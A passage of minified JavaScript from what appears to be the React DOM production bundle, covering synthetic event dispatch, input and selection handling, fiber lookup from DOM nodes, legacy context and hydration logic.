    deltaZ: 0,
    deltaMode: 0,
  }),
  Hp = De(Bp),
  Vp = [9, 13, 27, 32],
  Ni = xt && "CompositionEvent" in window,
  yr = null;
xt && "documentMode" in document && (yr = document.documentMode);
var Qp = xt && "TextEvent" in window && !yr,
  Tc = xt && (!Ni || (yr && 8 < yr && 11 >= yr)),
  Ds = " ",
  Os = !1;
function Lc(e, t) {
  switch (e) {
    case "keyup":
      return Vp.indexOf(t.keyCode) !== -1;
    case "keydown":
      return t.keyCode !== 229;
    case "keypress":
    case "mousedown":
    case "focusout":
      return !0;
    default:
      return !1;
  }
}
function jc(e) {
  return (e = e.detail), typeof e == "object" && "data" in e ? e.data : null;
}
var bn = !1;
function Kp(e, t) {
  switch (e) {
    case "compositionend":
      return jc(t);
    case "keypress":
      return t.which !== 32 ? null : ((Os = !0), Ds);
    case "textInput":
      return (e = t.data), e === Ds && Os ? null : e;
    default:
      return null;
  }
}
function Yp(e, t) {
  if (bn)
    return e === "compositionend" || (!Ni && Lc(e, t))
      ? ((e = Pc()), (El = ki = _t = null), (bn = !1), e)
      : null;
  switch (e) {
    case "paste":
      return null;
    case "keypress":
      if (!(t.ctrlKey || t.altKey || t.metaKey) || (t.ctrlKey && t.altKey)) {
        if (t.char && 1 < t.char.length) return t.char;
        if (t.which) return String.fromCharCode(t.which);
      }
      return null;
    case "compositionend":
      return Tc && t.locale !== "ko" ? null : t.data;
    default:
      return null;
  }
}
var Gp = {
  color: !0,
  date: !0,
  datetime: !0,
  "datetime-local": !0,
  email: !0,
  month: !0,
  number: !0,
  password: !0,
  range: !0,
  search: !0,
  tel: !0,
  text: !0,
  time: !0,
  url: !0,
  week: !0,
};
function zs(e) {
  var t = e && e.nodeName && e.nodeName.toLowerCase();
  return t === "input" ? !!Gp[e.type] : t === "textarea";
}
function $c(e, t, n, r) {
  sc(r),
    (t = Al(t, "onChange")),
    0 < t.length &&
      ((n = new Si("onChange", "change", null, n, r)),
      e.push({ event: n, listeners: t }));
}
var wr = null,
  _r = null;
function Xp(e) {
  Uc(e, 0);
}
function ua(e) {
  var t = En(e);
  if (tc(t)) return e;
}
function Zp(e, t) {
  if (e === "change") return t;
}
var _c = !1;
if (xt) {
  var Ia;
  if (xt) {
    var Ma = "oninput" in document;
    if (!Ma) {
      var As = document.createElement("div");
      As.setAttribute("oninput", "return;"),
        (Ma = typeof As.oninput == "function");
    }
    Ia = Ma;
  } else Ia = !1;
  _c = Ia && (!document.documentMode || 9 < document.documentMode);
}
function Ws() {
  wr && (wr.detachEvent("onpropertychange", Fc), (_r = wr = null));
}
function Fc(e) {
  if (e.propertyName === "value" && ua(_r)) {
    var t = [];
    $c(t, _r, e, gi(e)), fc(Xp, t);
  }
}
function Jp(e, t, n) {
  e === "focusin"
    ? (Ws(), (wr = t), (_r = n), wr.attachEvent("onpropertychange", Fc))
    : e === "focusout" && Ws();
}
function qp(e) {
  if (e === "selectionchange" || e === "keyup" || e === "keydown")
    return ua(_r);
}
function em(e, t) {
  if (e === "click") return ua(t);
}
function tm(e, t) {
  if (e === "input" || e === "change") return ua(t);
}
function nm(e, t) {
  return (e === t && (e !== 0 || 1 / e === 1 / t)) || (e !== e && t !== t);
}
var lt = typeof Object.is == "function" ? Object.is : nm;
function Fr(e, t) {
  if (lt(e, t)) return !0;
  if (typeof e != "object" || e === null || typeof t != "object" || t === null)
    return !1;
  var n = Object.keys(e),
    r = Object.keys(t);
  if (n.length !== r.length) return !1;
  for (r = 0; r < n.length; r++) {
    var l = n[r];
    if (!io.call(t, l) || !lt(e[l], t[l])) return !1;
  }
  return !0;
}
function Us(e) {
  for (; e && e.firstChild; ) e = e.firstChild;
  return e;
}
function Bs(e, t) {
  var n = Us(e);
  e = 0;
  for (var r; n; ) {
    if (n.nodeType === 3) {
      if (((r = e + n.textContent.length), e <= t && r >= t))
        return { node: n, offset: t - e };
      e = r;
    }
    e: {
      for (; n; ) {
        if (n.nextSibling) {
          n = n.nextSibling;
          break e;
        }
        n = n.parentNode;
      }
      n = void 0;
    }
    n = Us(n);
  }
}
function Rc(e, t) {
  return e && t
    ? e === t
      ? !0
      : e && e.nodeType === 3
      ? !1
      : t && t.nodeType === 3
      ? Rc(e, t.parentNode)
      : "contains" in e
      ? e.contains(t)
      : e.compareDocumentPosition
      ? !!(e.compareDocumentPosition(t) & 16)
      : !1
    : !1;
}
function Ic() {
  for (var e = window, t = Fl(); t instanceof e.HTMLIFrameElement; ) {
    try {
      var n = typeof t.contentWindow.location.href == "string";
    } catch {
      n = !1;
    }
    if (n) e = t.contentWindow;
    else break;
    t = Fl(e.document);
  }
  return t;
}
function Ci(e) {
  var t = e && e.nodeName && e.nodeName.toLowerCase();
  return (
    t &&
    ((t === "input" &&
      (e.type === "text" ||
        e.type === "search" ||
        e.type === "tel" ||
        e.type === "url" ||
        e.type === "password")) ||
      t === "textarea" ||
      e.contentEditable === "true")
  );
}
function rm(e) {
  var t = Ic(),
    n = e.focusedElem,
    r = e.selectionRange;
  if (
    t !== n &&
    n &&
    n.ownerDocument &&
    Rc(n.ownerDocument.documentElement, n)
  ) {
    if (r !== null && Ci(n)) {
      if (
        ((t = r.start),
        (e = r.end),
        e === void 0 && (e = t),
        "selectionStart" in n)
      )
        (n.selectionStart = t), (n.selectionEnd = Math.min(e, n.value.length));
      else if (
        ((e = ((t = n.ownerDocument || document) && t.defaultView) || window),
        e.getSelection)
      ) {
        e = e.getSelection();
        var l = n.textContent.length,
          a = Math.min(r.start, l);
        (r = r.end === void 0 ? a : Math.min(r.end, l)),
          !e.extend && a > r && ((l = r), (r = a), (a = l)),
          (l = Bs(n, a));
        var o = Bs(n, r);
        l &&
          o &&
          (e.rangeCount !== 1 ||
            e.anchorNode !== l.node ||
            e.anchorOffset !== l.offset ||
            e.focusNode !== o.node ||
            e.focusOffset !== o.offset) &&
          ((t = t.createRange()),
          t.setStart(l.node, l.offset),
          e.removeAllRanges(),
          a > r
            ? (e.addRange(t), e.extend(o.node, o.offset))
            : (t.setEnd(o.node, o.offset), e.addRange(t)));
      }
    }
    for (t = [], e = n; (e = e.parentNode); )
      e.nodeType === 1 &&
        t.push({ element: e, left: e.scrollLeft, top: e.scrollTop });
    for (typeof n.focus == "function" && n.focus(), n = 0; n < t.length; n++)
      (e = t[n]),
        (e.element.scrollLeft = e.left),
        (e.element.scrollTop = e.top);
  }
}
var lm = xt && "documentMode" in document && 11 >= document.documentMode,
  kn = null,
  Po = null,
  xr = null,
  To = !1;
function Hs(e, t, n) {
  var r = n.window === n ? n.document : n.nodeType === 9 ? n : n.ownerDocument;
  To ||
    kn == null ||
    kn !== Fl(r) ||
    ((r = kn),
    "selectionStart" in r && Ci(r)
      ? (r = { start: r.selectionStart, end: r.selectionEnd })
      : ((r = (
          (r.ownerDocument && r.ownerDocument.defaultView) ||
          window
        ).getSelection()),
        (r = {
          anchorNode: r.anchorNode,
          anchorOffset: r.anchorOffset,
          focusNode: r.focusNode,
          focusOffset: r.focusOffset,
        })),
    (xr && Fr(xr, r)) ||
      ((xr = r),
      (r = Al(Po, "onSelect")),
      0 < r.length &&
        ((t = new Si("onSelect", "select", null, t, n)),
        e.push({ event: t, listeners: r }),
        (t.target = kn))));
}
function cl(e, t) {
  var n = {};
  return (
    (n[e.toLowerCase()] = t.toLowerCase()),
    (n["Webkit" + e] = "webkit" + t),
    (n["Moz" + e] = "moz" + t),
    n
  );
}
var Sn = {
    animationend: cl("Animation", "AnimationEnd"),
    animationiteration: cl("Animation", "AnimationIteration"),
    animationstart: cl("Animation", "AnimationStart"),
    transitionend: cl("Transition", "TransitionEnd"),
  },
  Da = {},
  Mc = {};
xt &&
  ((Mc = document.createElement("div").style),
  "AnimationEvent" in window ||
    (delete Sn.animationend.animation,
    delete Sn.animationiteration.animation,
    delete Sn.animationstart.animation),
  "TransitionEvent" in window || delete Sn.transitionend.transition);
function ca(e) {
  if (Da[e]) return Da[e];
  if (!Sn[e]) return e;
  var t = Sn[e],
    n;
  for (n in t) if (t.hasOwnProperty(n) && n in Mc) return (Da[e] = t[n]);
  return e;
}
var Dc = ca("animationend"),
  Oc = ca("animationiteration"),
  zc = ca("animationstart"),
  Ac = ca("transitionend"),
  Wc = new Map(),
  Vs =
    "abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(
      " "
    );
function Qt(e, t) {
  Wc.set(e, t), hn(t, [e]);
}
for (var Oa = 0; Oa < Vs.length; Oa++) {
  var za = Vs[Oa],
    am = za.toLowerCase(),
    om = za[0].toUpperCase() + za.slice(1);
  Qt(am, "on" + om);
}
Qt(Dc, "onAnimationEnd");
Qt(Oc, "onAnimationIteration");
Qt(zc, "onAnimationStart");
Qt("dblclick", "onDoubleClick");
Qt("focusin", "onFocus");
Qt("focusout", "onBlur");
Qt(Ac, "onTransitionEnd");
zn("onMouseEnter", ["mouseout", "mouseover"]);
zn("onMouseLeave", ["mouseout", "mouseover"]);
zn("onPointerEnter", ["pointerout", "pointerover"]);
zn("onPointerLeave", ["pointerout", "pointerover"]);
hn(
  "onChange",
  "change click focusin focusout input keydown keyup selectionchange".split(" ")
);
hn(
  "onSelect",
  "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(
    " "
  )
);
hn("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]);
hn(
  "onCompositionEnd",
  "compositionend focusout keydown keypress keyup mousedown".split(" ")
);
hn(
  "onCompositionStart",
  "compositionstart focusout keydown keypress keyup mousedown".split(" ")
);
hn(
  "onCompositionUpdate",
  "compositionupdate focusout keydown keypress keyup mousedown".split(" ")
);
var mr =
    "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(
      " "
    ),
  im = new Set("cancel close invalid load scroll toggle".split(" ").concat(mr));
function Qs(e, t, n) {
  var r = e.type || "unknown-event";
  (e.currentTarget = n), ap(r, t, void 0, e), (e.currentTarget = null);
}
function Uc(e, t) {
  t = (t & 4) !== 0;
  for (var n = 0; n < e.length; n++) {
    var r = e[n],
      l = r.event;
    r = r.listeners;
    e: {
      var a = void 0;
      if (t)
        for (var o = r.length - 1; 0 <= o; o--) {
          var i = r[o],
            s = i.instance,
            u = i.currentTarget;
          if (((i = i.listener), s !== a && l.isPropagationStopped())) break e;
          Qs(l, i, u), (a = s);
        }
      else
        for (o = 0; o < r.length; o++) {
          if (
            ((i = r[o]),
            (s = i.instance),
            (u = i.currentTarget),
            (i = i.listener),
            s !== a && l.isPropagationStopped())
          )
            break e;
          Qs(l, i, u), (a = s);
        }
    }
  }
  if (Il) throw ((e = So), (Il = !1), (So = null), e);
}
function V(e, t) {
  var n = t[Fo];
  n === void 0 && (n = t[Fo] = new Set());
  var r = e + "__bubble";
  n.has(r) || (Bc(t, e, 2, !1), n.add(r));
}
function Aa(e, t, n) {
  var r = 0;
  t && (r |= 4), Bc(n, e, r, t);
}
var dl = "_reactListening" + Math.random().toString(36).slice(2);
function Rr(e) {
  if (!e[dl]) {
    (e[dl] = !0),
      Xu.forEach(function (n) {
        n !== "selectionchange" && (im.has(n) || Aa(n, !1, e), Aa(n, !0, e));
      });
    var t = e.nodeType === 9 ? e : e.ownerDocument;
    t === null || t[dl] || ((t[dl] = !0), Aa("selectionchange", !1, t));
  }
}
function Bc(e, t, n, r) {
  switch (Cc(t)) {
    case 1:
      var l = bp;
      break;
    case 4:
      l = kp;
      break;
    default:
      l = bi;
  }
  (n = l.bind(null, t, n, e)),
    (l = void 0),
    !ko ||
      (t !== "touchstart" && t !== "touchmove" && t !== "wheel") ||
      (l = !0),
    r
      ? l !== void 0
        ? e.addEventListener(t, n, { capture: !0, passive: l })
        : e.addEventListener(t, n, !0)
      : l !== void 0
      ? e.addEventListener(t, n, { passive: l })
      : e.addEventListener(t, n, !1);
}
function Wa(e, t, n, r, l) {
  var a = r;
  if (!(t & 1) && !(t & 2) && r !== null)
    e: for (;;) {
      if (r === null) return;
      var o = r.tag;
      if (o === 3 || o === 4) {
        var i = r.stateNode.containerInfo;
        if (i === l || (i.nodeType === 8 && i.parentNode === l)) break;
        if (o === 4)
          for (o = r.return; o !== null; ) {
            var s = o.tag;
            if (
              (s === 3 || s === 4) &&
              ((s = o.stateNode.containerInfo),
              s === l || (s.nodeType === 8 && s.parentNode === l))
            )
              return;
            o = o.return;
          }
        for (; i !== null; ) {
          if (((o = tn(i)), o === null)) return;
          if (((s = o.tag), s === 5 || s === 6)) {
            r = a = o;
            continue e;
          }
          i = i.parentNode;
        }
      }
      r = r.return;
    }
  fc(function () {
    var u = a,
      d = gi(n),
      v = [];
    e: {
      var g = Wc.get(e);
      if (g !== void 0) {
        var y = Si,
          w = e;
        switch (e) {
          case "keypress":
            if (Nl(n) === 0) break e;
          case "keydown":
          case "keyup":
            y = Dp;
            break;
          case "focusin":
            (w = "focus"), (y = Ra);
            break;
          case "focusout":
            (w = "blur"), (y = Ra);
            break;
          case "beforeblur":
          case "afterblur":
            y = Ra;
            break;
          case "click":
            if (n.button === 2) break e;
          case "auxclick":
          case "dblclick":
          case "mousedown":
          case "mousemove":
          case "mouseup":
          case "mouseout":
          case "mouseover":
          case "contextmenu":
            y = Rs;
            break;
          case "drag":
          case "dragend":
          case "dragenter":
          case "dragexit":
          case "dragleave":
          case "dragover":
          case "dragstart":
          case "drop":
            y = Np;
            break;
          case "touchcancel":
          case "touchend":
          case "touchmove":
          case "touchstart":
            y = Ap;
            break;
          case Dc:
          case Oc:
          case zc:
            y = Tp;
            break;
          case Ac:
            y = Up;
            break;
          case "scroll":
            y = Sp;
            break;
          case "wheel":
            y = Hp;
            break;
          case "copy":
          case "cut":
          case "paste":
            y = jp;
            break;
          case "gotpointercapture":
          case "lostpointercapture":
          case "pointercancel":
          case "pointerdown":
          case "pointermove":
          case "pointerout":
          case "pointerover":
          case "pointerup":
            y = Ms;
        }
        var x = (t & 4) !== 0,
          k = !x && e === "scroll",
          m = x ? (g !== null ? g + "Capture" : null) : g;
        x = [];
        for (var c = u, h; c !== null; ) {
          h = c;
          var b = h.stateNode;
          if (
            (h.tag === 5 &&
              b !== null &&
              ((h = b),
              m !== null && ((b = Tr(c, m)), b != null && x.push(Ir(c, b, h)))),
            k)
          )
            break;
          c = c.return;
        }
        0 < x.length &&
          ((g = new y(g, w, null, n, d)), v.push({ event: g, listeners: x }));
      }
    }
    if (!(t & 7)) {
      e: {
        if (
          ((g = e === "mouseover" || e === "pointerover"),
          (y = e === "mouseout" || e === "pointerout"),
          g &&
            n !== xo &&
            (w = n.relatedTarget || n.fromElement) &&
            (tn(w) || w[bt]))
        )
          break e;
        if (
          (y || g) &&
          ((g =
            d.window === d
              ? d
              : (g = d.ownerDocument)
              ? g.defaultView || g.parentWindow
              : window),
          y
            ? ((w = n.relatedTarget || n.toElement),
              (y = u),
              (w = w ? tn(w) : null),
              w !== null &&
                ((k = vn(w)), w !== k || (w.tag !== 5 && w.tag !== 6)) &&
                (w = null))
            : ((y = null), (w = u)),
          y !== w)
        ) {
          if (
            ((x = Rs),
            (b = "onMouseLeave"),
            (m = "onMouseEnter"),
            (c = "mouse"),
            (e === "pointerout" || e === "pointerover") &&
              ((x = Ms),
              (b = "onPointerLeave"),
              (m = "onPointerEnter"),
              (c = "pointer")),
            (k = y == null ? g : En(y)),
            (h = w == null ? g : En(w)),
            (g = new x(b, c + "leave", y, n, d)),
            (g.target = k),
            (g.relatedTarget = h),
            (b = null),
            tn(d) === u &&
              ((x = new x(m, c + "enter", w, n, d)),
              (x.target = h),
              (x.relatedTarget = k),
              (b = x)),
            (k = b),
            y && w)
          )
            t: {
              for (x = y, m = w, c = 0, h = x; h; h = yn(h)) c++;
              for (h = 0, b = m; b; b = yn(b)) h++;
              for (; 0 < c - h; ) (x = yn(x)), c--;
              for (; 0 < h - c; ) (m = yn(m)), h--;
              for (; c--; ) {
                if (x === m || (m !== null && x === m.alternate)) break t;
                (x = yn(x)), (m = yn(m));
              }
              x = null;
            }
          else x = null;
          y !== null && Ks(v, g, y, x, !1),
            w !== null && k !== null && Ks(v, k, w, x, !0);
        }
      }
      e: {
        if (
          ((g = u ? En(u) : window),
          (y = g.nodeName && g.nodeName.toLowerCase()),
          y === "select" || (y === "input" && g.type === "file"))
        )
          var S = Zp;
        else if (zs(g))
          if (_c) S = tm;
          else {
            S = qp;
            var N = Jp;
          }
        else
          (y = g.nodeName) &&
            y.toLowerCase() === "input" &&
            (g.type === "checkbox" || g.type === "radio") &&
            (S = em);
        if (S && (S = S(e, u))) {
          $c(v, S, n, d);
          break e;
        }
        N && N(e, g, u),
          e === "focusout" &&
            (N = g._wrapperState) &&
            N.controlled &&
            g.type === "number" &&
            ho(g, "number", g.value);
      }
      switch (((N = u ? En(u) : window), e)) {
        case "focusin":
          (zs(N) || N.contentEditable === "true") &&
            ((kn = N), (Po = u), (xr = null));
          break;
        case "focusout":
          xr = Po = kn = null;
          break;
        case "mousedown":
          To = !0;
          break;
        case "contextmenu":
        case "mouseup":
        case "dragend":
          (To = !1), Hs(v, n, d);
          break;
        case "selectionchange":
          if (lm) break;
        case "keydown":
        case "keyup":
          Hs(v, n, d);
      }
      var P;
      if (Ni)
        e: {
          switch (e) {
            case "compositionstart":
              var C = "onCompositionStart";
              break e;
            case "compositionend":
              C = "onCompositionEnd";
              break e;
            case "compositionupdate":
              C = "onCompositionUpdate";
              break e;
          }
          C = void 0;
        }
      else
        bn
          ? Lc(e, n) && (C = "onCompositionEnd")
          : e === "keydown" && n.keyCode === 229 && (C = "onCompositionStart");
      C &&
        (Tc &&
          n.locale !== "ko" &&
          (bn || C !== "onCompositionStart"
            ? C === "onCompositionEnd" && bn && (P = Pc())
            : ((_t = d),
              (ki = "value" in _t ? _t.value : _t.textContent),
              (bn = !0))),
        (N = Al(u, C)),
        0 < N.length &&
          ((C = new Is(C, e, null, n, d)),
          v.push({ event: C, listeners: N }),
          P ? (C.data = P) : ((P = jc(n)), P !== null && (C.data = P)))),
        (P = Qp ? Kp(e, n) : Yp(e, n)) &&
          ((u = Al(u, "onBeforeInput")),
          0 < u.length &&
            ((d = new Is("onBeforeInput", "beforeinput", null, n, d)),
            v.push({ event: d, listeners: u }),
            (d.data = P)));
    }
    Uc(v, t);
  });
}
function Ir(e, t, n) {
  return { instance: e, listener: t, currentTarget: n };
}
function Al(e, t) {
  for (var n = t + "Capture", r = []; e !== null; ) {
    var l = e,
      a = l.stateNode;
    l.tag === 5 &&
      a !== null &&
      ((l = a),
      (a = Tr(e, n)),
      a != null && r.unshift(Ir(e, a, l)),
      (a = Tr(e, t)),
      a != null && r.push(Ir(e, a, l))),
      (e = e.return);
  }
  return r;
}
function yn(e) {
  if (e === null) return null;
  do e = e.return;
  while (e && e.tag !== 5);
  return e || null;
}
function Ks(e, t, n, r, l) {
  for (var a = t._reactName, o = []; n !== null && n !== r; ) {
    var i = n,
      s = i.alternate,
      u = i.stateNode;
    if (s !== null && s === r) break;
    i.tag === 5 &&
      u !== null &&
      ((i = u),
      l
        ? ((s = Tr(n, a)), s != null && o.unshift(Ir(n, s, i)))
        : l || ((s = Tr(n, a)), s != null && o.push(Ir(n, s, i)))),
      (n = n.return);
  }
  o.length !== 0 && e.push({ event: t, listeners: o });
}
var sm = /\r\n?/g,
  um = /\u0000|\uFFFD/g;
function Ys(e) {
  return (typeof e == "string" ? e : "" + e)
    .replace(
      sm,
      `
`
    )
    .replace(um, "");
}
function fl(e, t, n) {
  if (((t = Ys(t)), Ys(e) !== t && n)) throw Error(E(425));
}
function Wl() {}
var Lo = null,
  jo = null;
function $o(e, t) {
  return (
    e === "textarea" ||
    e === "noscript" ||
    typeof t.children == "string" ||
    typeof t.children == "number" ||
    (typeof t.dangerouslySetInnerHTML == "object" &&
      t.dangerouslySetInnerHTML !== null &&
      t.dangerouslySetInnerHTML.__html != null)
  );
}
var _o = typeof setTimeout == "function" ? setTimeout : void 0,
  cm = typeof clearTimeout == "function" ? clearTimeout : void 0,
  Gs = typeof Promise == "function" ? Promise : void 0,
  dm =
    typeof queueMicrotask == "function"
      ? queueMicrotask
      : typeof Gs < "u"
      ? function (e) {
          return Gs.resolve(null).then(e).catch(fm);
        }
      : _o;
function fm(e) {
  setTimeout(function () {
    throw e;
  });
}
function Ua(e, t) {
  var n = t,
    r = 0;
  do {
    var l = n.nextSibling;
    if ((e.removeChild(n), l && l.nodeType === 8))
      if (((n = l.data), n === "/$")) {
        if (r === 0) {
          e.removeChild(l), $r(t);
          return;
        }
        r--;
      } else (n !== "$" && n !== "$?" && n !== "$!") || r++;
    n = l;
  } while (n);
  $r(t);
}
function Ot(e) {
  for (; e != null; e = e.nextSibling) {
    var t = e.nodeType;
    if (t === 1 || t === 3) break;
    if (t === 8) {
      if (((t = e.data), t === "$" || t === "$!" || t === "$?")) break;
      if (t === "/$") return null;
    }
  }
  return e;
}
function Xs(e) {
  e = e.previousSibling;
  for (var t = 0; e; ) {
    if (e.nodeType === 8) {
      var n = e.data;
      if (n === "$" || n === "$!" || n === "$?") {
        if (t === 0) return e;
        t--;
      } else n === "/$" && t++;
    }
    e = e.previousSibling;
  }
  return null;
}
var Gn = Math.random().toString(36).slice(2),
  st = "__reactFiber$" + Gn,
  Mr = "__reactProps$" + Gn,
  bt = "__reactContainer$" + Gn,
  Fo = "__reactEvents$" + Gn,
  pm = "__reactListeners$" + Gn,
  mm = "__reactHandles$" + Gn;
function tn(e) {
  var t = e[st];
  if (t) return t;
  for (var n = e.parentNode; n; ) {
    if ((t = n[bt] || n[st])) {
      if (
        ((n = t.alternate),
        t.child !== null || (n !== null && n.child !== null))
      )
        for (e = Xs(e); e !== null; ) {
          if ((n = e[st])) return n;
          e = Xs(e);
        }
      return t;
    }
    (e = n), (n = e.parentNode);
  }
  return null;
}
function Yr(e) {
  return (
    (e = e[st] || e[bt]),
    !e || (e.tag !== 5 && e.tag !== 6 && e.tag !== 13 && e.tag !== 3) ? null : e
  );
}
function En(e) {
  if (e.tag === 5 || e.tag === 6) return e.stateNode;
  throw Error(E(33));
}
function da(e) {
  return e[Mr] || null;
}
var Ro = [],
  Nn = -1;
function Kt(e) {
  return { current: e };
}
function Q(e) {
  0 > Nn || ((e.current = Ro[Nn]), (Ro[Nn] = null), Nn--);
}
function B(e, t) {
  Nn++, (Ro[Nn] = e.current), (e.current = t);
}
var Vt = {},
  xe = Kt(Vt),
  Pe = Kt(!1),
  cn = Vt;
function An(e, t) {
  var n = e.type.contextTypes;
  if (!n) return Vt;
  var r = e.stateNode;
  if (r && r.__reactInternalMemoizedUnmaskedChildContext === t)
    return r.__reactInternalMemoizedMaskedChildContext;
  var l = {},
    a;
  for (a in n) l[a] = t[a];
  return (
    r &&
      ((e = e.stateNode),
      (e.__reactInternalMemoizedUnmaskedChildContext = t),
      (e.__reactInternalMemoizedMaskedChildContext = l)),
    l
  );
}
function Te(e) {
  return (e = e.childContextTypes), e != null;
}
function Ul() {
  Q(Pe), Q(xe);
}
function Zs(e, t, n) {
  if (xe.current !== Vt) throw Error(E(168));
  B(xe, t), B(Pe, n);
}
function Hc(e, t, n) {
  var r = e.stateNode;
  if (((t = t.childContextTypes), typeof r.getChildContext != "function"))
    return n;
  r = r.getChildContext();
  for (var l in r) if (!(l in t)) throw Error(E(108, Jf(e) || "Unknown", l));
  return J({}, n, r);
}
function Bl(e) {
  return (
    (e =
      ((e = e.stateNode) && e.__reactInternalMemoizedMergedChildContext) || Vt),
    (cn = xe.current),
    B(xe, e),
    B(Pe, Pe.current),
    !0
  );
}
function Js(e, t, n) {
  var r = e.stateNode;
  if (!r) throw Error(E(169));
  n
    ? ((e = Hc(e, t, cn)),
      (r.__reactInternalMemoizedMergedChildContext = e),
      Q(Pe),
      Q(xe),
      B(xe, e))
    : Q(Pe),
    B(Pe, n);
}
var ht = null,
  fa = !1,
  Ba = !1;
function Vc(e) {
  ht === null ? (ht = [e]) : ht.push(e);
}
function hm(e) {
  (fa = !0), Vc(e);
}
function Yt() {
  if (!Ba && ht !== null) {
    Ba = !0;
    var e = 0,
      t = z;
    try {
      var n = ht;
      for (z = 1; e < n.length; e++) {
        var r = n[e];
        do r = r(!0);
        while (r !== null);
      }
      (ht = null), (fa = !1);
    } catch (l) {
      throw (ht !== null && (ht = ht.slice(e + 1)), vc(yi, Yt), l);
    } finally {
      (z = t), (Ba = !1);
    }
  }
  return null;
}
var Cn = [],
  Pn = 0,
  Hl = null,
  Vl = 0,
  Ae = [],
  We = 0,
  dn = null,
  vt = 1,
  gt = "";
function Jt(e, t) {
  (Cn[Pn++] = Vl), (Cn[Pn++] = Hl), (Hl = e), (Vl = t);
}
function Qc(e, t, n) {
  (Ae[We++] = vt), (Ae[We++] = gt), (Ae[We++] = dn), (dn = e);
  var r = vt;
  e = gt;
  var l = 32 - nt(r) - 1;
  (r &= ~(1 << l)), (n += 1);
  var a = 32 - nt(t) + l;
  if (30 < a) {
    var o = l - (l % 5);
    (a = (r & ((1 << o) - 1)).toString(32)),
      (r >>= o),
      (l -= o),
      (vt = (1 << (32 - nt(t) + l)) | (n << l) | r),
      (gt = a + e);
  } else (vt = (1 << a) | (n << l) | r), (gt = e);
}
function Pi(e) {
  e.return !== null && (Jt(e, 1), Qc(e, 1, 0));
}
function Ti(e) {
  for (; e === Hl; )
    (Hl = Cn[--Pn]), (Cn[Pn] = null), (Vl = Cn[--Pn]), (Cn[Pn] = null);
  for (; e === dn; )
    (dn = Ae[--We]),
      (Ae[We] = null),
      (gt = Ae[--We]),
      (Ae[We] = null),
      (vt = Ae[--We]),
      (Ae[We] = null);
}
var Fe = null,
  _e = null,
  Y = !1,
  qe = null;
function Kc(e, t) {
  var n = Ue(5, null, null, 0);
  (n.elementType = "DELETED"),
    (n.stateNode = t),
    (n.return = e),
    (t = e.deletions),
    t === null ? ((e.deletions = [n]), (e.flags |= 16)) : t.push(n);
}
function qs(e, t) {
  switch (e.tag) {
    case 5:
      var n = e.type;
      return (
        (t =
          t.nodeType !== 1 || n.toLowerCase() !== t.nodeName.toLowerCase()
            ? null
            : t),
        t !== null
          ? ((e.stateNode = t), (Fe = e), (_e = Ot(t.firstChild)), !0)
          : !1
      );
    case 6:
      return (
        (t = e.pendingProps === "" || t.nodeType !== 3 ? null : t),
        t !== null ? ((e.stateNode = t), (Fe = e), (_e = null), !0) : !1
      );
    case 13:
      return (
        (t = t.nodeType !== 8 ? null : t),
        t !== null
          ? ((n = dn !== null ? { id: vt, overflow: gt } : null),
            (e.memoizedState = {
              dehydrated: t,
              treeContext: n,
              retryLane: 1073741824,
            }),
            (n = Ue(18, null, null, 0)),
            (n.stateNode = t),
            (n.return = e),
            (e.child = n),
            (Fe = e),
            (_e = null),
            !0)
          : !1
      );
    default:
      return !1;
  }
}
function Io(e) {
  return (e.mode & 1) !== 0 && (e.flags & 128) === 0;
}
function Mo(e) {
  if (Y) {
    var t = _e;
    if (t) {
      var n = t;
      if (!qs(e, t)) {
        if (Io(e)) throw Error(E(418));
        t = Ot(n.nextSibling);
        var r = Fe;
        t && qs(e, t)
          ? Kc(r, n)
          : ((e.flags = (e.flags & -4097) | 2), (Y = !1), (Fe = e));
      }
    } else {
      if (Io(e)) throw Error(E(418));
      (e.flags = (e.flags & -4097) | 2), (Y = !1), (Fe = e);
    }
  }
}
function eu(e) {
  for (e = e.return; e !== null && e.tag !== 5 && e.tag !== 3 && e.tag !== 13; )
    e = e.return;
  Fe = e;
}
function pl(e) {
  if (e !== Fe) return !1;
  if (!Y) return eu(e), (Y = !0), !1;
  var t;
  if (
    ((t = e.tag !== 3) &&
      !(t = e.tag !== 5) &&
      ((t = e.type),
      (t = t !== "head" && t !== "body" && !$o(e.type, e.memoizedProps))),
    t && (t = _e))
  ) {
    if (Io(e)) throw (Yc(), Error(E(418)));
    for (; t; ) Kc(e, t), (t = Ot(t.nextSibling));
  }
  if ((eu(e), e.tag === 13)) {
    if (((e = e.memoizedState), (e = e !== null ? e.dehydrated : null), !e))
      throw Error(E(317));
    e: {
      for (e = e.nextSibling, t = 0; e; ) {
        if (e.nodeType === 8) {
          var n = e.data;
          if (n === "/$") {
            if (t === 0) {
              _e = Ot(e.nextSibling);
              break e;
            }
            t--;
          } else (n !== "$" && n !== "$!" && n !== "$?") || t++;
        }
        e = e.nextSibling;
      }
      _e = null;
    }
  } else _e = Fe ? Ot(e.stateNode.nextSibling) : null;
  return !0;
}
function Yc() {
  for (var e = _e; e; ) e = Ot(e.nextSibling);
}
function Wn() {
  (_e = Fe = null), (Y = !1);
}
function Li(e) {
  qe === null ? (qe = [e]) : qe.push(e);
}
var vm = Et.ReactCurrentBatchConfig;
function Ze(e, t) {
  if (e && e.defaultProps) {
    (t = J({}, t)), (e = e.defaultProps);
    for (var n in e) t[n] === void 0 && (t[n] = e[n]);
    return t;
  }
  return t;
}
var Ql = Kt(null),
  Kl = null,
  Tn = null,
  ji = null;
function $i() {
  ji = Tn = Kl = null;
}
function _i(e) {
  var t = Ql.current;
  Q(Ql), (e._currentValue = t);
}
function Do(e, t, n) {
  for (; e !== null; ) {
    var r = e.alternate;
    if (
      ((e.childLanes & t) !== t
        ? ((e.childLanes |= t), r !== null && (r.childLanes |= t))
        : r !== null && (r.childLanes & t) !== t && (r.childLanes |= t),
      e === n)
    )
      break;
    e = e.return;
